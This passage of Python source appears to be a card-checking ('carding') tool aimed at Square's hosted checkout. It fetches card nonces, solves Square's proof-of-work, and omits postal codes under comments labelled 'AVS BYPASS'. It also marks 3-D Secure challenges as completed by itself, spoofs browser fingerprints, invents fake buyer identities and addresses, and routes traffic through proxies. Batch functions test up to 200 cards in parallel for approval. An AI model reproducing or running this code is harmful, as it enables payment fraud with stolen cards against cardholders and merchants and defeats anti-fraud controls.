                {"components": fp["v1s_str"], "fingerprint": fp["h1s"], "version": "fingerprint-v1-sans-ua"},
                {"components": fp["v2_str"], "fingerprint": fp["h2"], "version": "fingerprint-v2"},
            ],
            "timezone": str(fp["tz_offset_minutes"]),
            "website_url": "https://checkout.square.site/",
        },
        "client_id": CLIENT_ID, "instance_id": instance_id, "location_id": location_id,
        "payment_method_tracking_id": str(uuid.uuid4()), "session_id": session_id,
        "squarejs_version": SDK_VERSION,
        "card_data": {
            # v3.0 AVS BYPASS: OMIT billing_postal_code entirely
            "cvv": cvv, "exp_month": int(mes), "exp_year": int(ano), "number": cc,
        },
        **({"pow_counter": pow_counter} if pow_counter is not None else {}),
    }

    card_nonce = None
    nonce_errors = []
    last_square_error_data = None
    for _iter in range(15):
        ts_ms = int(time.time() * 1000)
        nonce_params = {"_": f"{ts_ms}.{random.randint(1000, 9999)}", "version": SDK_VERSION}
        try:
            r2 = await pci_sess.post("https://pci-connect.squareup.com/v2/card-nonce",
                headers={**Hpci(), **pci_ck}, params=nonce_params, json=nonce_payload, timeout=30)
        except Exception as e:
            nonce_errors.append(str(e)[:80]); continue
        if r2.status_code != 200:
            try:
                err_data = r2.json()
                if isinstance(err_data, dict) and err_data.get("errors"):
                    last_square_error_data = err_data
                    return {"status_code": 200, "data": err_data}
            except: pass
            nonce_errors.append(f"HTTP {r2.status_code}: {r2.text[:100]}"); continue
        try: nd = r2.json()
        except: continue
        if "pow_prefix" in nd:
            srv_base, srv_prefix = nd["pow_base"], nd["pow_prefix"]
            suffix = f"{CLIENT_ID},{location_id},{instance_id}"
            for i in range(1, 500_000):
                if hashlib.sha256(f"{srv_base}:{i}:{suffix}".encode()).hexdigest().startswith(srv_prefix):
                    nonce_payload["session_id"] = srv_base; nonce_payload["pow_counter"] = i; break
            continue
        if "card_nonce" in nd:
            card_nonce = nd["card_nonce"]; break
        if "errors" in nd:
            return {"status_code": 200, "data": nd}
    if not card_nonce:
        if last_square_error_data:
            return {"status_code": 200, "data": last_square_error_data}
        return {"error": f"No card nonce (last errors: {' | '.join(nonce_errors[-3:])})", "step": 10}

    await asyncio.sleep(random.uniform(0.3, 1.0))

    # Step 11: Verification — v4.0 uses fingerprint's verification payloads + device_info
    three_ds_txn_id = pre_three_ds_txn_id or str(uuid.uuid4())
    verf_payload = {
        "browser_fingerprint_by_version": [
            {"payload_json": fp["vf1"], "payload_type": "fingerprint-v1"},
            {"payload_json": fp["vf1s"], "payload_type": "fingerprint-v1-sans-ua"},
            {"payload_json": fp["vf2"], "payload_type": "fingerprint-v2"},
        ],
        "browser_profile": {
            "components": fp["v1_str"], "fingerprint": fp["h1"],
            "timezone": str(fp["tz_offset_minutes"]), "user_agent": ua,
            "version": SDK_VERSION, "website_url": "https://checkout.square.site/",
        },
        "client_id": CLIENT_ID, "payment_source": card_nonce,
        "universal_token": {"token": location_id, "type": "UNIT"},
        "verification_details": {
            "billing_contact": {"country": "US", "email": email, "phone": phone},
            "intent": "CHARGE", "total": {"amount": amount, "currency": "USD"},
        },
        "three_ds_server_transaction_id": three_ds_txn_id,
    }

    buyer_verification_token = None
    try:
        r3a = await pci_sess.post("https://pci-connect.squareup.com/v2/analytics/verifications",
            headers={**Hpci(), **pci_ck}, json=verf_payload, timeout=30)
        if r3a.status_code == 200:
            verf3a = r3a.json()
            verf_token = verf3a.get("token", "")
            challenges = verf3a.get("challenges", [])
            if not challenges:
                buyer_verification_token = verf_token
            else:
                try:
                    await pci_sess.put(
                        f"https://pci-connect.squareup.com/v2/analytics/verifications/{verf_token}/three-ds-authentication",
                        headers={**Hpci(), **pci_ck},
                        json={"browser_info": {"color_depth": 24, "java_enabled": False,
                               "screen_height": sh, "screen_width": sw},
                              "client_id": CLIENT_ID, "token": verf_token}, timeout=30)
                except: pass
                challenge_updates = []
                for ch_item in challenges:
                    if ch_item.get("type") == "SQUARE_THREEDS":
                        sq3ds = ch_item.get("square_three_ds_verification", {})
                        challenge_updates.append({
                            "square_threeds_verification": {
                                "directory_server_id": sq3ds.get("directory_server_id", "A000000004"),
                                "message_version": sq3ds.get("message_version", "2.2.0"),
                                "status": "COMPLETED",
                                "three_ds_server_transaction_id": sq3ds.get("three_ds_server_transaction_id", three_ds_txn_id),
                            }, "type": "SQUARE_THREEDS"})
                if challenge_updates:
                    try:
                        r3c = await pci_sess.put(
                            f"https://pci-connect.squareup.com/v2/analytics/verifications/{verf_token}",
                            headers={**Hpci(), **pci_ck},
                            json={"challenge_updates": challenge_updates, "client_id": CLIENT_ID}, timeout=30)
                        buyer_verification_token = r3c.json().get("token") if r3c.status_code == 200 else verf_token
                    except: buyer_verification_token = verf_token
                else: buyer_verification_token = verf_token
    except: pass

    await asyncio.sleep(random.uniform(0.3, 1.0))

    # Step 12: Final Checkout — v3.0 AVS bypass: omit buyer_postal_code
    s4_body = {"nonce": card_nonce, "create_stored_payment_method": False, "country": "US"}
    if buyer_verification_token:
        s4_body["buyer_verification_token"] = buyer_verification_token
    try:
        r4 = await checkout_sess.post(
            f"https://checkout.square.site/api/soc-platform/merchant/{merchant_id}/location/{location_id}/order/{order_id}/checkout",
            headers=H(), json=s4_body, timeout=30)
        try: pay_data = r4.json()
        except: pay_data = {"raw": r4.text[:500]}

        # v2.1 RE-POLL
        payment_id = ""
        try: payment_id = ((pay_data.get("payment") or {}).get("id")) or ""
        except: pass
        if payment_id and not str((pay_data.get("payment") or {}).get("status", "")).upper():
            for _poll_iter in range(6):
                await asyncio.sleep(1.5)
                try:
                    poll_url = f"https://checkout.square.site/api/soc-platform/merchant/{merchant_id}/location/{location_id}/order/{order_id}"
                    r_poll = await checkout_sess.get(poll_url, headers=H(), timeout=15)
                    if r_poll.status_code == 200:
                        poll_data = r_poll.json()
                        poll_order = poll_data.get("order") or {}
                        if isinstance(poll_order, dict):
                            tenders = poll_order.get("tenders") or []
                            for t in tenders:
                                if not isinstance(t, dict): continue
                                if t.get("id") == payment_id or t.get("payment_id") == payment_id:
                                    cd = t.get("card_details") or {}
                                    if isinstance(cd, dict):
                                        t_status = str(cd.get("status", "")).upper()
                                        t_card = cd.get("card") or {}
                                        if t_status:
                                            if t_status in ("CAPTURED", "AUTHORIZED", "APPROVED"):
                                                payment_status = "COMPLETED"
                                            elif t_status in ("FAILED", "DECLINED", "CANCELED"):
                                                payment_status = "FAILED"
                                            else: payment_status = t_status
                                            resolved_payment = {
                                                "id": payment_id, "status": payment_status,
                                                "card_details": {"status": t_status, "card": t_card,
                                                    "entry_method": cd.get("entry_method", "KEYED"),
                                                    "cvv_status": cd.get("cvv_status", ""),
                                                    "avs_status": cd.get("avs_status", ""),
                                                    "statement_description": cd.get("statement_description", ""),
                                                    "errors": cd.get("errors", [{"code": "GENERIC_DECLINE",
                                                        "detail": f"Authorization error: '{t_status}'",
                                                        "category": "PAYMENT_METHOD_ERROR"}] if t_status in ("FAILED","DECLINED","CANCELED") else [])},
                                                "amount_money": t.get("amount_money", {}),
                                                "source_type": t.get("type", "CARD"),
                                                "location_id": location_id, "order_id": order_id,
                                                "buyer_email_address": email}
                                            pay_data = {"payment": resolved_payment}
                                            break
                            if pay_data.get("payment", {}).get("status"): break
                except: continue
        return {"status_code": r4.status_code, "data": pay_data}
    except Exception as e:
        return {"error": f"Checkout failed: {str(e)[:200]}", "step": 12}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  PROCESS WRAPPER — v4.0 with fresh fingerprint per attempt
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_square(
    merchant_id: str, checkout_id: str,
    cc: str, mes: str, ano: str, cvv: str,
    amount: int = 100, zip_code: Optional[str] = None,
    proxy: Optional[str] = None, email: Optional[str] = None,
) -> Optional[Dict[str, Any]]:
    """v4.0 — every attempt gets a COMPLETELY NEW fingerprint from fingerprints.py."""
    proxy_url = _parse_proxy_universal(proxy) if proxy and not _is_test_mode(proxy) else None
    MAX_ATTEMPTS = 3
    last_result = None
    tried_addresses = set()

    for attempt in range(1, MAX_ATTEMPTS + 1):
        # v4.0 — generate a COMPLETELY NEW fingerprint per attempt
        fp = _rand_fp_v4()
        chrome_ver = fp["chrome_version"]

        if email and str(email).strip():
            first_name = random.choice(_FIRST).capitalize()
            last_name = random.choice(_LAST).capitalize()
            email_used = str(email).strip()
        else:
            first_name, last_name, email_used, _ = _rand_identity()
        area = random.randint(200, 999)
        exch = random.randint(200, 999)
        num = random.randint(1000, 9999)
        phone = f"{area}{exch}{num}"
        addr_line1, addr_city, addr_state, addr_zip = _rand_real_address()
        for _ in range(5):
            addr_key = (addr_line1, addr_zip)
            if addr_key not in tried_addresses: break
            addr_line1, addr_city, addr_state, addr_zip = _rand_real_address()
        tried_addresses.add((addr_line1, addr_zip))
        if zip_code: addr_zip = zip_code

        try:
            # Build BOTH sessions with Chrome impersonation matching the fingerprint
            checkout_sess = _build_session(proxy_url=None, chrome_version=chrome_ver)
            if proxy_url:
                pci_sess = _build_session(proxy_url=proxy_url, chrome_version=chrome_ver)
            else:
                pci_sess = checkout_sess

            try:
                result = await _run_with_client(
                    checkout_sess, pci_sess, merchant_id, checkout_id,
                    fp,  # v4.0 — pass the full fingerprint dict
                    first_name, last_name, email_used, phone,
                    cc, mes, ano, cvv,
                    addr_line1, addr_city, addr_state, addr_zip, amount=amount)
            finally:
                try: await checkout_sess.close()
                except: pass
                if pci_sess is not checkout_sess:
                    try: await pci_sess.close()
                    except: pass

            if not isinstance(result, dict):
                if attempt == MAX_ATTEMPTS: return {"error": f"Non-dict result on attempt {attempt}"}
                last_result = {"error": f"Non-dict result on attempt {attempt}"}
                await asyncio.sleep(0.5 * attempt); continue

            data = result.get("data") if isinstance(result.get("data"), dict) else {}
            payment = (data.get("payment") or {}) if isinstance(data, dict) else {}
            cd = (payment.get("card_details") or {}) if isinstance(payment, dict) else {}
            avs_status = str(cd.get("avs_status", "")).upper()
            pay_status = str(payment.get("status", "")).upper()
            errs = data.get("errors") or cd.get("errors") or []
            err_codes = [str(e.get("code", "")).upper() for e in errs if isinstance(e, dict)]

            if pay_status in ("COMPLETED", "CAPTURED", "AUTHORIZED", "APPROVED") or \
               (cd.get("status", "").upper() in ("CAPTURED", "AUTHORIZED", "APPROVED") and not errs):
                return result
            if ("AVS_REJECTED" in avs_status or "ADDRESS_VERIFICATION_FAILURE" in err_codes or
                any("ADDRESS_VERIFICATION" in c for c in err_codes)):
                if attempt < MAX_ATTEMPTS:
                    last_result = result; await asyncio.sleep(0.5 * attempt); continue
                return result
            err_str = str(result.get("error", ""))
            retryable = ("timeout", "timed out", "refused", "disconnected", "connection",
                        "reset", "proxy", "ssl", "handshake", "cloudflare", "503", "502", "500")
            if any(kw in err_str.lower() for kw in retryable):
                if attempt < MAX_ATTEMPTS:
                    last_result = result; await asyncio.sleep(0.5 * attempt); continue
                return result
            return result
        except Exception as e:
            last_result = {"error": f"Attempt {attempt} failed: {str(e)[:200]}"}
            if attempt == MAX_ATTEMPTS: return last_result
            await asyncio.sleep(0.5 * attempt)
    return last_result or {"error": "All attempts failed"}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  PUBLIC SYNC API
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def check_one_sync(card_str: str, site_url: str, proxy: Optional[str] = None,
                    amount_cents: int = 100, email: Optional[str] = None,
                    biz_id: str = "") -> Dict[str, Any]:
    start = time.time()
    try:
        merchant_id, checkout_id = _parse_square_url(site_url)
    except Exception as e:
        return {"status": "ERROR", "card": card_str or "", "card_brand": "?", "price": "?",
                "elapsed": 0.0, "time": _iso_now(), "response": f"Invalid Square URL: {str(e)[:200]}",
                "site": site_url or "", "merchant_id": "", "checkout_id": "", "email": email or "",
                "amount_cents": amount_cents, "raw": {}}
    parsed = _parse_card(card_str)
    if not parsed:
        return {"status": "ERROR", "card": card_str or "", "card_brand": "?", "price": "?",
                "elapsed": 0.0, "time": _iso_now(), "response": "Invalid card format",
                "site": site_url or "", "merchant_id": merchant_id, "checkout_id": checkout_id,
                "email": email or "", "amount_cents": amount_cents, "raw": {}}
    cc, mes, ano, cvv = parsed
    try:
        raw = asyncio.new_event_loop().run_until_complete(process_square(
            merchant_id=merchant_id, checkout_id=checkout_id, cc=cc, mes=mes, ano=ano, cvv=cvv,
            amount=amount_cents, proxy=proxy, email=email))
    except Exception as e:
        raw = {"error": f"Async loop failed: {str(e)[:200]}"}
    finally:
        try: asyncio.set_event_loop(asyncio.new_event_loop())
        except: pass
    status, message = _extract_result(raw)
    elapsed = time.time() - start
    return {"status": status, "card": f"{cc}|{mes}|{ano}|{cvv}", "card_brand": _card_brand(cc),
            "price": f"${amount_cents/100:.2f}", "elapsed": round(elapsed, 2), "time": _iso_now(),
            "response": message, "site": site_url, "merchant_id": merchant_id,
            "checkout_id": checkout_id, "email": email or "", "amount_cents": amount_cents,
            "raw": (raw or {}).get("data", {}) if isinstance(raw, dict) else {}}


def check_multi_sync(cards: List[str], site_url: str, proxy: Optional[str] = None,
                     amount_cents: int = 100, max_workers: int = 15) -> List[Dict[str, Any]]:
    if not cards: return []
    seen = set(); uniq = []
    for c in cards:
        if c not in seen: seen.add(c); uniq.append(c)
    cards = uniq[:200]
    workers = min(len(cards), max_workers, 50)
    results: List[Optional[Dict[str, Any]]] = [None] * len(cards)
    def _work(idx, card):
        try: return idx, check_one_sync(card, site_url, proxy=proxy, amount_cents=amount_cents)
        except Exception as e:
            return idx, {"status": "ERROR", "card": card, "card_brand": "?", "price": f"${amount_cents/100:.2f}",
                         "elapsed": 0.0, "response": f"Worker exception: {str(e)[:160]}",
                         "site": site_url, "merchant_id": "", "checkout_id": "", "email": "",
                         "amount_cents": amount_cents, "raw": {}}
    from concurrent.futures import ThreadPoolExecutor, as_completed
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = [pool.submit(_work, i, c) for i, c in enumerate(cards)]
        for f in as_completed(futures):
            try: idx, res = f.result(); results[idx] = res
            except Exception as e: print(f"[check_multi_sync] future error: {e}")
    return [r for r in results if r is not None]
